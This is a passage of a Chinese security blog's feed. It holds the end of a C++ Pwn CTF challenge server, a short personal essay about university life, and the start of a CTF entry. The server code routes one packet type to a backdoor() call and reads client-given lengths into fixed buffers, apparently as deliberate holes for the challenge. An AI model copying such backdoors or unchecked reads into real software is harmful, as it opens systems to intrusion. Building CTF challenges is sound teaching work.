punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> retry_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf1"</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> done_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xef"</span><span class="token punctuation">;</span>  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    byte<span class="token operator">*</span> buf  <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">magiccmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>RECV_MAGIC<span class="token punctuation">)</span><span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> length <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> packet_type <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> key_len<span class="token punctuation">,</span> id_len<span class="token punctuation">,</span> expr_len<span class="token punctuation">,</span> res_len<span class="token punctuation">,</span> status<span class="token punctuation">,</span> i<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memset</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      string skey<span class="token punctuation">;</span>      string s_corr_id<span class="token punctuation">;</span>      string s_res<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> corr_id<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> packet<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> expr<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> res<span class="token punctuation">;</span>      Q q<span class="token punctuation">;</span>      Data d<span class="token punctuation">;</span>      <span class="token keyword">switch</span><span class="token punctuation">(</span>packet_type<span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// connect</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>starting <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            starting <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> done_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// declare</span>          uuid_t uuid<span class="token punctuation">;</span>          <span class="token function">uuid_generate</span><span class="token punctuation">(</span>uuid<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">uuid_unparse</span><span class="token punctuation">(</span>uuid<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          mq<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>pair<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span><span class="token punctuation">(</span>skey<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          packet <span class="token operator">=</span> <span class="token function">construct_result</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> packet<span class="token punctuation">,</span> <span class="token number">36</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// retrieve</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          id_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    corr_id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>corr_id<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>corr_id<span class="token punctuation">,</span> id_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">+</span>id_len<span class="token operator">!=</span>length<span class="token number">-12</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          s_corr_id <span class="token operator">=</span> corr_id<span class="token punctuation">;</span>          it_find <span class="token operator">=</span> mq<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>skey<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>it_find<span class="token operator">!=</span>mq<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            i <span class="token operator">=</span> mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>corr_id <span class="token operator">!=</span> s_corr_id<span class="token punctuation">)</span>            <span class="token punctuation">{</span>              <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">// 出队</span>              res_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>res<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              packet <span class="token operator">=</span> <span class="token function">construct_result</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>res<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> packet<span class="token punctuation">,</span> res_len<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>                         <span class="token punctuation">}</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// call</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          id_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    corr_id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>corr_id<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>corr_id<span class="token punctuation">,</span> id_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          expr_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    expr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>expr_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>expr<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>expr_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>expr<span class="token punctuation">,</span> expr_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">+</span>id_len<span class="token operator">+</span>expr_len<span class="token operator">!=</span>length<span class="token number">-12</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token comment" spellcheck="true">// 执行运算</span>          res <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          status <span class="token operator">=</span> <span class="token function">calc</span><span class="token punctuation">(</span>expr<span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>status <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          s_corr_id <span class="token operator">=</span> corr_id<span class="token punctuation">;</span>          s_res <span class="token operator">=</span> res<span class="token punctuation">;</span>          it_find <span class="token operator">=</span> mq<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>skey<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>it_find<span class="token operator">!=</span>mq<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 入队</span>            d<span class="token punctuation">.</span>corr_id <span class="token operator">=</span> s_corr_id<span class="token punctuation">;</span>            d<span class="token punctuation">.</span>res <span class="token operator">=</span> s_res<span class="token punctuation">;</span>            mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> done_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// close </span>          <span class="token keyword">return</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// break;</span>        <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>          <span class="token function">backdoor</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>                  <span class="token keyword">default</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// error</span>          <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  MQ mq<span class="token punctuation">;</span>  <span class="token function">handle</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> mq<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>今天就水到这儿吧😭。。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;使用Docker进行Pwn题环境部署&quot;&gt;&lt;a href=&quot;#使用Docker进行Pwn题环境部署&quot; class=&quot;headerlink&quot; title=&quot;使用Docker进行Pwn题环境部署&quot;&gt;&lt;/a&gt;使用Docker进行Pwn题环境部署&lt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="环境部署" scheme="http://www.yof3ng.xyz/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>Some_words_of_today</title>
    <link href="http://www.yof3ng.xyz/2018/10/29/Some-words-of-today/"/>
    <id>http://www.yof3ng.xyz/2018/10/29/Some-words-of-today/</id>
    <published>2018-10-29T15:03:45.000Z</published>
    <updated>2018-10-29T15:46:20.970Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Some-words-of-today"><a href="#Some-words-of-today" class="headerlink" title="Some_words_of_today"></a>Some_words_of_today</h1><blockquote><p>今日份闲扯。🙃</p></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 现在时间已经23:06了，今天给几位学弟简单讲了一些小知识（虽然自己很low，但希望学弟可以很强），写完这篇水文就睡吧。不知道什么时候开始就已经习惯了这么晚睡，虽然知道晚睡啥的，熬夜什么的对身体不好balabala，但是生活所迫，被生活安排的明明白白，虽然目前国内计算机行业现状如下图：</p><p><img src="https://i.loli.net/2018/10/29/5bd722c007501.png" alt=""></p><p>抑或是如下图：</p><p><img src="https://i.loli.net/2018/10/29/5bd72383adca2.png" alt=""></p><p>&nbsp; &nbsp; &nbsp; &nbsp; 刚入学那会儿，大学嘛，憧憬的是啥？无非就是吃喝玩乐，交朋友（找女票？）以及少部分学习。对啊，就是这样没错啊，大家都是这么认为的嘛，一直到大一过去一大半，我也是学学停停，玩玩游戏，<del>以及一场起于高中，止于大一末，经历过一起，也经历过分离，还经历过异地，像电视剧一样的恋爱</del>,呸呸呸 。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 很普遍的一个现象是：很多刚踏入大学校门的人，就想开始来一场轰轰烈烈的恋爱，来释放自己的天性，拥抱心中的美好😄，到后来却往往是最初开始的人走不到一块儿。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 或许得到了什么东西，就该失去点另外的什么东西。所以那段时间我只是生活在一个小圈子里，虽然错过了很多很多的精彩，虚度了些许时日，但也成长了许多。经历了种种后，我才逐渐明白我的大学生活，乃至人生意义所在😥，风花雪月不过偶尔，自强不息便有远方。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 所谓大学者，非谓有大楼之谓也，有大师之谓也，但是现在又有几个能做到？。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 与其奢望平台如何如何帮自己，那为何不“天行健，君子以自强不息”呢？</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 大学只是一个平台，一个给你去生活，去展示，去实现，去创造，去体验社会的小空间。当然，可能某些人进入大学之后，啊我的大学怎么怎么样，怎么怎么惨，抱怨资源不公，哀叹社会如何，然后转身又扑进了游戏世界。想想其实也挺傻的，不公能怎样？谁让自己搏不了一个好平台，谁让自己得不到那点仅有的资源，又是谁在一次一次堕落之后继续堕落？那肯定是自己咯😭。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 所以如果自己不去实现一点能够实现的价值，来印证一下自己的能力，那如何才能获得那所谓的公平，如何去融入你批判，哀叹的那个社会。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 未来之路虽然坎坷，但希望与诸位同行之人，共同前进。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Publish by Yof3ng.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Some-words-of-today&quot;&gt;&lt;a href=&quot;#Some-words-of-today&quot; class=&quot;headerlink&quot; title=&quot;Some_words_of_today&quot;&gt;&lt;/a&gt;Some_words_of_today&lt;/h1&gt;&lt;bloc
      
    
    </summary>
    
      <category term="杂文" scheme="http://www.yof3ng.xyz/categories/%E6%9D%82%E6%96%87/"/>
    
    
      <category term="杂文" scheme="http://www.yof3ng.xyz/tags/%E6%9D%82%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title>wandoucup-ctf</title>
    <link href="http://www.yof3ng.xyz/2018/10/28/wandoucup-ctf/"/>
    <id>http://www.yof3ng.xyz/2018/10/28/wandoucup-ctf/</id>
    <published>2018-10-28T06:01:54.000Z</published>
    <updated>2018-10-29T05:35:15.486Z</updated>
    
